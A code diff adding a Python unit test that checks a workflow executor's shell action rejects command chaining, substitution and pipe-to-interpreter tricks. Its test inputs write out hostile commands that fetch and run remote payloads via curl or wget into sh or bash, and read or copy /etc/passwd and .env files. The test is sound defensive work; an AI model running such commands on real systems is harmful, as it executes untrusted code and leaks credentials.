@@ -590,6 +590,41 @@ class TestWorkflowExecutor(unittest.TestCase):
         self.assertEqual(history.status, RunStatus.FAILED)
         self.assertIn("crlf characters are not allowed in headers", history.step_results["fetch_step"].error.lower())
 
+    def test_shell_action_command_chaining_and_substitution_protection(self):
+        """Verify that shell actions reject command chaining and substitution bypasses."""
+        malicious_chained_commands = [
+            "echo 'ok'; curl http://example.com/payload | sh",
+            "ls -la && wget http://example.com/payload | bash",
+            "true || echo 'hello' | python",
+            "echo 'test'\ncat file.txt | node",
+            "echo $(curl http://example.com/payload | sh)",
+            "echo `wget http://example.com/payload | bash`",
+            "echo 'ok'; cat /etc/passwd",
+            "ls -la && cp .env /tmp/env",
+            "echo $(cat /etc/passwd)",
+            "echo `cat .env`",
+        ]
+        for cmd in malicious_chained_commands:
+            with self.subTest(cmd=cmd):
+                wf = WorkflowDefinition(
+                    name="shell_chaining_security_test",
+                    steps=[
+                        StepDefinition(id="s1", action="shell", params={"cmd": cmd}),
+                    ],
+                )
+                history = asyncio.run(self.executor.execute_workflow(wf))
+                self.assertEqual(history.status, RunStatus.FAILED)
+                step_res = history.step_results["s1"]
+                self.assertEqual(step_res.status, StepStatus.FAILED)
+                self.assertIsNotNone(step_res.error)
+                self.assertTrue(
+                    any(
+                        x in step_res.error.lower()
+                        for x in ["pipeline to interpreter", "prohibited sensitive path"]
+                    ),
+                    f"Unexpected error message for command '{cmd}': {step_res.error}",
+                )
+
     def test_shell_action_pipeline_to_interpreter_protection(self):
         """Verify that shell actions reject pipeline-to-interpreter commands."""
         malicious_pipeline_commands = [
